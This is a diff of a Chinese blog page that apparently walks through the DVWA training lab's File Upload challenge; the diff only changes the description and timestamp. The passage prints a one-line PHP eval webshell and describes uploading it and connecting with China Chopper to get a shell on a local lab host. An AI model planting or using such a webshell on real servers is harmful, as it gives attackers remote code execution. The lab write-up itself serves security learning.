@@ -95,17 +95,17 @@
 
 
 
-<meta name="description" content="File Upload 和 Brute Force">
+<meta name="description" content="File Upload 和 Brute Force放假了是真的高兴！！！φ(゜▽゜*)♪">
 <meta property="og:type" content="article">
 <meta property="og:title" content="dvwa（3-4）">
 <meta property="og:url" content="http://yoursite.com/2018/02/20/dvwa（3-4）/index.html">
 <meta property="og:site_name" content="misaka的博客">
-<meta property="og:description" content="File Upload 和 Brute Force">
+<meta property="og:description" content="File Upload 和 Brute Force放假了是真的高兴！！！φ(゜▽゜*)♪">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-20T13:12:56.817Z">
+<meta property="og:updated_time" content="2018-02-20T13:16:10.615Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="dvwa（3-4）">
-<meta name="twitter:description" content="File Upload 和 Brute Force">
+<meta name="twitter:description" content="File Upload 和 Brute Force放假了是真的高兴！！！φ(゜▽゜*)♪">
 
 
 
@@ -325,7 +325,7 @@
       
 
       
-        <p>File Upload 和 Brute Force<br><a id="more"></a></p>
+        <p>File Upload 和 Brute Force<br>放假了是真的高兴！！！φ(゜▽゜*)♪<br><a id="more"></a></p>
 <h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line"></div><div class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123; </div><div class="line">    // Where are we going to be writing to? </div><div class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; </div><div class="line">    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); </div><div class="line"></div><div class="line">    // Can we move the file to the upload folder? </div><div class="line">    if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123; </div><div class="line">        // No </div><div class="line">        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; </div><div class="line">    &#125; </div><div class="line">    else &#123; </div><div class="line">        // Yes! </div><div class="line">        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"></div><div class="line">?&gt;</div><div class="line"></div><div class="line">``` </div><div class="line"></div><div class="line">从源码中可以看出，它并没有对上传文件做任何的检查与过滤，而且因为使用了basename()函数，在上传成功后，会返回上传文件的路径。  </div><div class="line">这就很明显的存在文件上传漏洞。</div><div class="line">我上传一个一句话木马：abc.php</div></pre></td></tr></table></figure></p>
 <p>&lt;?php @eval($_POST[‘abc’]);?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">页面回显：../../hackable/uploads/abc.php succesfully uploaded!  </div><div class="line">成功上传，并回显了文件路径。  </div><div class="line">然后就用菜刀链接，地址构造为：  </div><div class="line">http://127.0.0.1/DVWA/hackable/uploads/abc.php  </div><div class="line">成功拿到shell。</div><div class="line">### medium</div><div class="line">先看代码</div></pre></td></tr></table></figure></p>
 <p>&lt;?php </p>
